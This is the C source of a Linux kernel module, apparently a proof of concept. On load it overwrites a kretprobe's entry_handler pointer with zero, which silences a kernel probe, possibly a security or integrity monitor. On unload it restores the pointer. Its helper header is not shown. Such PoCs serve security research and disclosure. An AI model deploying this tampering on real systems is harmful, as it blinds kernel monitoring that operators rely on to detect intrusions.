// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#define POC_NAME "poc_kill_entry"
#define POC_DESC "inte poc clear kretprobe entry handler"

#include "poc_common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("dere3046");
MODULE_DESCRIPTION(POC_DESC);

static unsigned long saved_entry;

static int __init poc_init(void)
{
	unsigned long target;
	u32 offset;
	int ret;

	ret = poc_init_common();
	if (ret)
		return ret;
	if (!poc_hash_probe)
		return -EINVAL;
	ret = poc_ti_offset("kretprobe", "entry_handler", &offset);
	if (ret)
		return ret;
	target = poc_hash_probe + offset;
	saved_entry = READ_ONCE(*(unsigned long *)target);
	poc_store_word((void *)target, 0);
	poc_info("entry %lx -> 0", saved_entry);
	return 0;
}

static void __exit poc_exit(void)
{
	if (poc_hash_probe) {
		u32 offset;

		if (!poc_ti_offset("kretprobe", "entry_handler", &offset))
			poc_store_word((void *)(poc_hash_probe + offset), saved_entry);
	}
	poc_exit_common();
}

module_init(poc_init);
module_exit(poc_exit);
